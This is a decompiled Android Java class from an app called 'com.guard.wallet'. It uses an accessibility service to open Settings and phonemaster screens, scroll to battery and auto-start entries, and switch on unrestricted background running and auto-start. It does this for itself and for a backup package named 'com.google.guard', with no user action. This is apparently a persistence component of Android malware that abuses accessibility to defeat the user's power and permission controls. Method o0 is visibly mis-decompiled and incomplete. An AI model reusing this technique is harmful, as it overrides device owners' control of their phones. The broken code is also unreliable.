package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.thread.AbstractC0243l;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;
import org.bouncycastle.i18n.TextBundle;
import p000a.AbstractC0000a;
import p014r.EnumC0892e;

/* loaded from: classes.dex */
public final class e0 extends AbstractC0414c {

    /* renamed from: y */
    public static final /* synthetic */ int f875y = 0;

    /* renamed from: r */
    public final AtomicReference f876r;

    /* renamed from: s */
    public final AtomicBoolean f877s;

    /* renamed from: t */
    public final AtomicBoolean f878t;

    /* renamed from: u */
    public final AtomicBoolean f879u;

    /* renamed from: v */
    public final AtomicBoolean f880v;

    /* renamed from: w */
    public final AtomicBoolean f881w;

    /* renamed from: x */
    public final AtomicBoolean f882x;

    public e0() {
        super(n0(), "com.android.settings");
        this.f876r = new AtomicReference(EnumC0892e.KEEP_ALIVE_UNKNOWN);
        this.f877s = new AtomicBoolean(false);
        this.f878t = new AtomicBoolean(false);
        this.f879u = new AtomicBoolean(true);
        this.f880v = new AtomicBoolean(true);
        this.f881w = new AtomicBoolean(false);
        this.f882x = new AtomicBoolean(false);
        try {
            this.f852p.schedule(new d0(this, 3), 60L, TimeUnit.SECONDS);
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.e0", e2);
        }
    }

    public static CombineFilter b0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_BATTERY_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("COMMON_SETTINGS_BATTERY_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static ListenWindow c0() {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow d0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.android.settings.applications.InstalledAppDetailsTop");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        if (!AbstractC0026q.m151B(str)) {
            listenWindow.setMatchs(new LinkedList());
            listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        }
        return listenWindow;
    }

    public static ListenWindow e0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "com.transsion.settings.applications.appinfo.AppInfoSettings");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        if (!AbstractC0026q.m151B(str)) {
            listenWindow.setMatchs(new LinkedList());
            listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        }
        return listenWindow;
    }

    public static CombineFilter f0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_POWER_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("COMMON_SETTINGS_POWER_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static CombineFilter g0() {
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_USE_POWER_TEXT"))) {
            return null;
        }
        CombineFilter combineFilter = new CombineFilter();
        StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
        m1008b.setContains(AbstractC0250f.m627b("COMMON_SETTINGS_USE_POWER_TEXT"));
        combineFilter.getStringConditions().add(m1008b);
        return combineFilter;
    }

    public static ListenWindow h0() {
        ListenWindow listenWindow = new ListenWindow("com.transsion.phonemaster", "android.widget.FrameLayout");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow i0() {
        ListenWindow listenWindow = new ListenWindow("com.transsion.phonemaster", "com.cyin.himgr.autostart.AutoStartActivity");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        return listenWindow;
    }

    public static ListenWindow m0(String str) {
        ListenWindow listenWindow = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
        AbstractC0413b.m1023q(32, AbstractC0413b.m1024r(listenWindow), listenWindow).add(16384);
        if (!AbstractC0026q.m151B(str)) {
            listenWindow.setMatchs(new LinkedList());
            listenWindow.getMatchs().add(AbstractC0414c.m1033H(str));
        }
        return listenWindow;
    }

    public static LinkedList n0() {
        LinkedList linkedList = new LinkedList();
        linkedList.add(AbstractC0414c.m1035J());
        linkedList.add(i0());
        linkedList.add(h0());
        linkedList.add(d0(null));
        linkedList.add(e0(null));
        linkedList.add(m0(null));
        linkedList.add(c0());
        return linkedList;
    }

    public static CombineFiltersWithOr q0() {
        CombineFilter combineFilter;
        CombineFilter combineFilter2;
        CombineFiltersWithOr combineFiltersWithOr = new CombineFiltersWithOr();
        combineFiltersWithOr.setFilters(new LinkedList());
        CombineFilter combineFilter3 = null;
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_UNRESTRICTED_TEXT"))) {
            combineFilter = null;
        } else {
            combineFilter = new CombineFilter();
            StringCondition m1008b = AbstractC0413b.m1008b(combineFilter, AbstractC0000a.m7c(combineFilter, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("COMMON_SETTINGS_UNRESTRICTED_TEXT", m1008b, combineFilter, m1008b);
        }
        if (combineFilter != null) {
            combineFiltersWithOr.getFilters().add(combineFilter);
        }
        if (AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_NO_RESTRICTED_TEXT"))) {
            combineFilter2 = null;
        } else {
            combineFilter2 = new CombineFilter();
            StringCondition m1008b2 = AbstractC0413b.m1008b(combineFilter2, AbstractC0000a.m7c(combineFilter2, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("COMMON_SETTINGS_NO_RESTRICTED_TEXT", m1008b2, combineFilter2, m1008b2);
        }
        if (combineFilter2 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter2);
        }
        if (!AbstractC0026q.m151B(AbstractC0250f.m627b("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"))) {
            combineFilter3 = new CombineFilter();
            StringCondition m1008b3 = AbstractC0413b.m1008b(combineFilter3, AbstractC0000a.m7c(combineFilter3, "className", "android.widget.TextView"), TextBundle.TEXT_ENTRY);
            AbstractC0413b.m1028v("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT", m1008b3, combineFilter3, m1008b3);
        }
        if (combineFilter3 != null) {
            combineFiltersWithOr.getFilters().add(combineFilter3);
        }
        return combineFiltersWithOr;
    }

    @Override // p012o.AbstractC0414c
    /* renamed from: Z */
    public final void mo1051Z() {
        ReentrantLock reentrantLock = this.f851o;
        if (reentrantLock.tryLock()) {
            try {
                if (!m1049T()) {
                    Log.d("o.e0", "准备结束本地保活自动化引擎");
                    AbstractC0184g.m354h(100);
                    m1050X();
                    if (MyAccessibilityService.m554P() != null) {
                        MyAccessibilityService.m554P().m543x();
                    }
                    p0();
                    this.f852p.shutdownNow();
                    AbstractC0243l.m591a(this.f864c);
                    this.f850n.clear();
                    if (AbstractC0026q.m162M()) {
                        AbstractC0251g.T0(5);
                    }
                    AbstractC0184g.m349c();
                    Log.d("o.e0", "已结束本地保活自动化引擎");
                    AbstractC0414c.m1044W();
                    mo1001d();
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("o.e0", e2);
            }
            reentrantLock.unlock();
        }
    }

    public final boolean j0() {
        try {
            if (!m1078q(Collections.singletonList(c0()))) {
                return false;
            }
            Log.d("o.e0", "已进入App耗电管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.e0", e2);
            return false;
        }
    }

    public final boolean k0() {
        try {
            String x02 = Objects.equals(this.f876r.get(), EnumC0892e.KEEP_ALIVE_MAIN_APP) ? AbstractC0251g.x0() : AbstractC0251g.m658e();
            LinkedList linkedList = new LinkedList();
            linkedList.add(d0(x02));
            linkedList.add(e0(x02));
            linkedList.add(m0(x02));
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.e0", "已进入App详情窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.e0", e2);
            return false;
        }
    }

    public final boolean l0() {
        try {
            LinkedList linkedList = new LinkedList();
            linkedList.add(i0());
            linkedList.add(h0());
            if (!m1078q(linkedList)) {
                return false;
            }
            Log.d("o.e0", "已进入自启动管理窗口");
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.e0", e2);
            return false;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:16:0x002a, code lost:
    
        r7 = r12.findOneByCombine(r2);
     */
    /* JADX WARN: Removed duplicated region for block: B:10:0x00f9 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:12:0x00fa  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final UiObject o0(UiObject uiObject) {
        UiObject uiObject2;
        UiObject uiObject3;
        UiObject uiObject4;
        CombineFilter f02;
        CombineFilter b02;
        CombineFilter g02;
        AtomicInteger atomicInteger;
        UiObject findOneByCombine;
        UiObject uiObject5 = null;
        try {
            uiObject.refresh();
            Log.d("o.e0", "开始滚动电池电量管理栏目");
            f02 = f0();
            b02 = b0();
            g02 = g0();
            atomicInteger = new AtomicInteger(0);
        } catch (Exception e2) {
            e = e2;
            uiObject2 = null;
            uiObject3 = null;
        }
        if (b02 == null && f02 == null && g02 == null) {
            uiObject4 = null;
            uiObject2 = null;
            return uiObject5 != null ? uiObject5 : uiObject4 != null ? uiObject4 : uiObject2;
        }
        uiObject3 = null;
        if (b02 != null) {
            try {
                findOneByCombine = uiObject.findOneByCombine(b02);
            } catch (Exception e3) {
                e = e3;
                uiObject2 = null;
                AbstractC0026q.m186s("o.e0", e);
                uiObject4 = uiObject5;
                uiObject5 = uiObject3;
                if (uiObject5 != null) {
                }
            }
        } else {
            findOneByCombine = null;
        }
        if (g02 != null) {
            try {
                uiObject5 = uiObject.findOneByCombine(g02);
            } catch (Exception e4) {
                e = e4;
                uiObject2 = uiObject5;
                uiObject5 = findOneByCombine;
                AbstractC0026q.m186s("o.e0", e);
                uiObject4 = uiObject5;
                uiObject5 = uiObject3;
                if (uiObject5 != null) {
                }
            }
        }
        while (uiObject.canScrollForward() && atomicInteger.incrementAndGet() < 10) {
            Log.d("o.e0", "滚动视图可以向下滚动");
            if ((findOneByCombine != null && findOneByCombine.visibleToUser()) || ((uiObject3 != null && uiObject3.visibleToUser()) || (uiObject5 != null && uiObject5.visibleToUser()))) {
                break;
            }
            if (uiObject.scrollForwardByGesture()) {
                Log.d("o.e0", "向下滚动查找电池电量管理栏目");
                AbstractC0251g.T0(10);
                uiObject.refresh();
                if (f02 != null) {
                    uiObject3 = uiObject.findOneByCombine(f02);
                }
                if (b02 != null) {
                    findOneByCombine = uiObject.findOneByCombine(b02);
                }
                if (g02 != null) {
                    uiObject5 = uiObject.findOneByCombine(g02);
                }
            }
        }
        atomicInteger.set(0);
        uiObject2 = uiObject5;
        uiObject5 = findOneByCombine;
        while (uiObject.canScrollBackward() && atomicInteger.incrementAndGet() < 10) {
            try {
                Log.d("o.e0", "滚动视图可以向上滚动");
                if ((uiObject5 != null && uiObject5.visibleToUser()) || ((uiObject3 != null && uiObject3.visibleToUser()) || (uiObject2 != null && uiObject2.visibleToUser()))) {
                    break;
                }
                if (uiObject.scrollBackwardByGesture()) {
                    Log.d("o.e0", "向上滚动查找电池电量管理栏目");
                    AbstractC0251g.T0(10);
                    uiObject.refresh();
                    if (f02 != null) {
                        uiObject3 = uiObject.findOneByCombine(f02);
                    }
                    if (b02 != null) {
                        uiObject5 = uiObject.findOneByCombine(b02);
                    }
                    if (g02 != null) {
                        uiObject2 = uiObject.findOneByCombine(g02);
                    }
                }
            } catch (Exception e5) {
                e = e5;
                AbstractC0026q.m186s("o.e0", e);
                uiObject4 = uiObject5;
                uiObject5 = uiObject3;
                if (uiObject5 != null) {
                }
            }
        }
        uiObject4 = uiObject5;
        uiObject5 = uiObject3;
        if (uiObject5 != null) {
        }
    }

    public final void p0() {
        try {
            PowerControlStateVO m707k = AbstractC0252h.m707k(MainApplication.getAppContext().getPackageName());
            m707k.setPackageName(MainApplication.getAppContext().getPackageName());
            AtomicBoolean atomicBoolean = this.f877s;
            if (atomicBoolean.get()) {
                m707k.setAllowAutoStart(Boolean.valueOf(atomicBoolean.get()));
            }
            AtomicBoolean atomicBoolean2 = this.f879u;
            if (atomicBoolean2.get()) {
                m707k.setAllowRelateStart(Boolean.valueOf(atomicBoolean2.get()));
            }
            AtomicBoolean atomicBoolean3 = this.f881w;
            if (atomicBoolean3.get()) {
                m707k.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean3.get()));
            }
            m707k.setRetryCount(m707k.getRetryCount() + 1);
            AbstractC0252h.m691L(m707k);
            Log.d("o.e0", "主进程保活策略已保存");
            PowerControlStateVO m707k2 = AbstractC0252h.m707k("com.google.guard");
            m707k2.setPackageName("com.google.guard");
            AtomicBoolean atomicBoolean4 = this.f878t;
            if (atomicBoolean4.get()) {
                m707k2.setAllowAutoStart(Boolean.valueOf(atomicBoolean4.get()));
            }
            AtomicBoolean atomicBoolean5 = this.f880v;
            if (atomicBoolean5.get()) {
                m707k2.setAllowRelateStart(Boolean.valueOf(atomicBoolean5.get()));
            }
            AtomicBoolean atomicBoolean6 = this.f882x;
            if (atomicBoolean6.get()) {
                m707k2.setAllowAllFullBackground(Boolean.valueOf(atomicBoolean6.get()));
            }
            m707k2.setRetryCount(m707k2.getRetryCount() + 1);
            AbstractC0252h.m691L(m707k2);
            Log.d("o.e0", "备用进程保活策略已保存");
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.e0", e2);
        }
    }

    @Override // p012o.AbstractC0414c, p012o.C0416e
    /* renamed from: u */
    public final void mo1002u(AccessibilityEvent accessibilityEvent, String str, String str2) {
        try {
            if (m1049T()) {
                return;
            }
            if (accessibilityEvent != null) {
                super.mo1002u(accessibilityEvent, str, str2);
            }
            boolean k02 = k0();
            String str3 = this.f864c;
            ConcurrentLinkedQueue concurrentLinkedQueue = this.f850n;
            if (k02) {
                concurrentLinkedQueue.remove("keepAliveInAppBattery");
                concurrentLinkedQueue.remove("keepAliveInAutoStart");
                if (!concurrentLinkedQueue.contains("keepAliveInAppDetail")) {
                    concurrentLinkedQueue.add("keepAliveInAppDetail");
                    AbstractC0243l.m593c(new d0(this, 0), str3);
                }
            }
            if (j0()) {
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAutoStart");
                if (!concurrentLinkedQueue.contains("keepAliveInAppBattery")) {
                    concurrentLinkedQueue.add("keepAliveInAppBattery");
                    AbstractC0243l.m593c(new d0(this, 1), str3);
                }
            }
            if (l0()) {
                concurrentLinkedQueue.remove("keepAliveInAppDetail");
                concurrentLinkedQueue.remove("keepAliveInAppBattery");
                if (concurrentLinkedQueue.contains("keepAliveInAutoStart")) {
                    return;
                }
                concurrentLinkedQueue.add("keepAliveInAutoStart");
                AbstractC0243l.m593c(new d0(this, 2), str3);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("o.e0", e2);
        }
    }
}
